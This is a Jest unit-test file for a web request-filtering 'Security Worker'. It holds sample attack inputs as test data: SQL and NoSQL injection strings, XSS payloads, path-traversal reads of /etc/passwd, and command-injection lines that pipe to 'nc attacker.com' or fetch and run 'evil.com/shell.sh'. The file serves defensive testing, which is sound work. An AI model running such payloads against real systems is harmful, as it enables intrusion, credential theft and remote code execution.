// Unit tests for Security Worker
import { SecurityWorker } from '../../workers/security-worker/src/index';
import { securityRules } from '../../workers/security-worker/src/rules';
import { SecurityRule } from '../../workers/security-worker/src/types';

describe('Security Worker', () => {
  let securityWorker: SecurityWorker;
  let mockEnv: any;

  beforeEach(() => {
    // Create a mock that returns a new Response each time
    const mockFetch = jest.fn().mockImplementation(() => {
      return Promise.resolve(
        new Response(JSON.stringify({ allowed: true }), {
          headers: { 'Content-Type': 'application/json' }
        })
      );
    });

    mockEnv = {
      RATE_LIMITER: {
        idFromName: jest.fn().mockReturnValue('test-id'),
        get: jest.fn().mockReturnValue({
          fetch: mockFetch
        })
      },
      AUDIT_LOGS: {
        put: jest.fn().mockResolvedValue(undefined),
        list: jest.fn().mockResolvedValue({ objects: [] }),
        get: jest.fn().mockResolvedValue(null)
      },
      KV: {
        get: jest.fn().mockResolvedValue(null),
        put: jest.fn().mockResolvedValue(undefined)
      },
      ENVIRONMENT: 'test',
      PAGERDUTY_TOKEN: 'test-token',
      PAGERDUTY_ROUTING_KEY: 'test-routing-key'
    };

    securityWorker = new SecurityWorker(mockEnv);
  });

  describe('SQL Injection Detection', () => {
    test('should block basic SQL injection attempts', async () => {
      const maliciousUrls = [
        'https://api.twist.io/api/v1/user?id=1\' OR \'1\'=\'1',
        'https://api.twist.io/api/v1/user?id=1; DROP TABLE users;--',
        'https://api.twist.io/api/v1/user?name=admin\' UNION SELECT * FROM passwords--',
        'https://api.twist.io/api/v1/search?q=\' OR 1=1--',
        'https://api.twist.io/api/v1/data?filter=id=1 OR SLEEP(5)--'
      ];

      for (const url of maliciousUrls) {
        const request = new Request(url);
        const result = await securityWorker.processRequest(request);
        
        expect(result.allowed).toBe(false);
        expect(result.action).toBe('block');
        expect(result.rules.some(r => r.ruleId === 'sql-injection')).toBe(true);
      }
    });

    test('should allow legitimate requests with SQL-like terms', async () => {
      const legitimateUrls = [
        'https://api.twist.io/api/v1/blog?title=How to select the right database',
        'https://api.twist.io/api/v1/product?name=Union Jack Flag',
        'https://api.twist.io/api/v1/article?content=Drop shipping guide'
      ];

      for (const url of legitimateUrls) {
        const request = new Request(url);
        const result = await securityWorker.processRequest(request);
        
        expect(result.allowed).toBe(true);
      }
    });
  });

  describe('XSS Detection', () => {
    test('should block XSS attempts', async () => {
      const xssUrls = [
        'https://api.twist.io/search?q=<script>alert("XSS")</script>',
        'https://api.twist.io/user?name=<img src=x onerror=alert(1)>',
        'https://api.twist.io/comment?text=<iframe src="javascript:alert(\'XSS\')"></iframe>',
        'https://api.twist.io/profile?bio=<svg onload=alert(document.domain)>',
        'https://api.twist.io/input?data=javascript:alert(1)'
      ];

      for (const url of xssUrls) {
        const request = new Request(url);
        const result = await securityWorker.processRequest(request);
        
        expect(result.allowed).toBe(false);
        expect(result.action).toBe('block');
        expect(result.rules.some(r => r.ruleId === 'xss-attempt')).toBe(true);
      }
    });
  });

  describe('Path Traversal Detection', () => {
    test('should block path traversal attempts', async () => {
      const pathTraversalUrls = [
        'https://api.twist.io/file/../../../etc/passwd',
        'https://api.twist.io/download/..\\..\\windows\\system32\\config\\sam',
        'https://api.twist.io/static/%2e%2e%2f%2e%2e%2fetc/passwd',
        'https://api.twist.io/assets/./././../config.json'
      ];

      for (const url of pathTraversalUrls) {
        const request = new Request(url);
        const result = await securityWorker.processRequest(request);
        
        expect(result.allowed).toBe(false);
        expect(result.action).toBe('block');
        expect(result.rules.some(r => r.ruleId === 'path-traversal')).toBe(true);
      }
    });
  });

  describe('Rate Limit Bypass Detection', () => {
    test('should detect rate limit bypass attempts', async () => {
      const request = new Request('https://api.twist.io/api/v1/vau', {
        headers: {
          'X-Forwarded-For': '192.168.1.1',
          'X-Real-IP': '10.0.0.1',
          'X-Originating-IP': '172.16.0.1',
          'X-Remote-IP': '192.168.2.1'
        }
      });

      const result = await securityWorker.processRequest(request);
      
      expect(result.rules.some(r => r.ruleId === 'rate-limit-bypass')).toBe(true);
    });
  });

  describe('Suspicious User Agent Detection', () => {
    test('should challenge suspicious user agents', async () => {
      const suspiciousAgents = [
        'sqlmap/1.0',
        'nikto/2.1.5',
        'Mozilla/5.0 (compatible; Nmap Scripting Engine)',
        'python-requests/2.25.1',
        'curl/7.68.0'
      ];

      for (const ua of suspiciousAgents) {
        const request = new Request('https://api.twist.io/api/v1/data', {
          headers: { 'User-Agent': ua }
        });
        
        const result = await securityWorker.processRequest(request);
        expect(result.rules.some(r => r.ruleId === 'suspicious-ua')).toBe(true);
      }
    });

    test('should allow known good bots', async () => {
      const goodBots = [
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'facebookexternalhit/1.1',
        'Twitterbot/1.0'
      ];

      for (const ua of goodBots) {
        const request = new Request('https://api.twist.io/api/v1/data', {
          headers: { 'User-Agent': ua }
        });
        
        const result = await securityWorker.processRequest(request);
        expect(result.rules.some(r => r.ruleId === 'suspicious-ua')).toBe(false);
      }
    });
  });

  describe('Large Request Body Detection', () => {
    test('should block oversized requests', async () => {
      const request = new Request('https://api.twist.io/api/v1/upload', {
        method: 'POST',
        headers: {
          'Content-Length': '2097152' // 2MB
        }
      });

      const result = await securityWorker.processRequest(request);
      
      expect(result.allowed).toBe(false);
      expect(result.rules.some(r => r.ruleId === 'large-body')).toBe(true);
    });
  });

  describe('Geographic Restrictions', () => {
    test('should block requests from sanctioned countries', async () => {
      const blockedCountries = ['KP', 'IR', 'SY', 'CU'];

      for (const country of blockedCountries) {
        const request = new Request('https://api.twist.io/api/v1/data');
        Object.defineProperty(request, 'cf', {
          value: { country },
          writable: false
        });

        const result = await securityWorker.processRequest(request);
        
        expect(result.allowed).toBe(false);
        expect(result.action).toBe('geo_block');
      }
    });

    test('should allow requests from non-sanctioned countries', async () => {
      const allowedCountries = ['US', 'GB', 'CA', 'AU', 'JP'];

      for (const country of allowedCountries) {
        const request = new Request('https://api.twist.io/api/v1/data');
        Object.defineProperty(request, 'cf', {
          value: { country },
          writable: false
        });

        const result = await securityWorker.processRequest(request);
        
        expect(result.action).not.toBe('geo_block');
      }
    });
  });

  describe('Command Injection Detection', () => {
    test('should block command injection attempts', async () => {
      const commandInjectionUrls = [
        'https://api.twist.io/exec?cmd=ls; cat /etc/passwd',
        'https://api.twist.io/ping?host=8.8.8.8 | nc attacker.com 1234',
        'https://api.twist.io/convert?file=image.jpg && curl evil.com/shell.sh | bash',
        'https://api.twist.io/process?data=`whoami`',
        'https://api.twist.io/run?script=$(cat /etc/shadow)'
      ];

      for (const url of commandInjectionUrls) {
        const request = new Request(url);
        const result = await securityWorker.processRequest(request);
        
        expect(result.allowed).toBe(false);
        expect(result.action).toBe('block');
        expect(result.rules.some(r => r.ruleId === 'command-injection')).toBe(true);
      }
    });
  });

  describe('NoSQL Injection Detection', () => {
    test('should block NoSQL injection attempts', async () => {
      const noSqlUrls = [
        'https://api.twist.io/user?filter={"$ne": null}',
        'https://api.twist.io/search?q={"$or": [{"active": true}, {"active": false}]}',
        'https://api.twist.io/data?query={"$where": "this.password == \'admin\'"}',
        'https://api.twist.io/find?filter={"age": {"$gte": 0}}'
      ];

      for (const url of noSqlUrls) {
        const request = new Request(url);
        const result = await securityWorker.processRequest(request);
        
        expect(result.allowed).toBe(false);
        expect(result.rules.some(r => r.ruleId === 'nosql-injection')).toBe(true);
      }
    });
  });

  describe('Protocol Smuggling Detection', () => {
    test('should block protocol smuggling attempts', async () => {
      const request = new Request('https://api.twist.io/api/v1/data', {
        headers: {
          'Content-Length': '100',
          'Transfer-Encoding': 'chunked'
        }
      });

      const result = await securityWorker.processRequest(request);
      
      expect(result.allowed).toBe(false);
      expect(result.rules.some(r => r.ruleId === 'protocol-smuggling')).toBe(true);
    });
  });
});

describe('Security Rules', () => {
  test('all rules should have required properties', () => {
    for (const rule of securityRules) {
      expect(rule).toHaveProperty('id');
      expect(rule).toHaveProperty('name');
      expect(rule).toHaveProperty('condition');
      expect(rule).toHaveProperty('action');
      expect(rule).toHaveProperty('severity');
      
      expect(['block', 'challenge', 'log']).toContain(rule.action);
      expect(['low', 'medium', 'high', 'critical']).toContain(rule.severity);
    }
  });

  test('rule IDs should be unique', () => {
    const ids = securityRules.map(r => r.id);
    const uniqueIds = new Set(ids);
    expect(uniqueIds.size).toBe(ids.length);
  });
});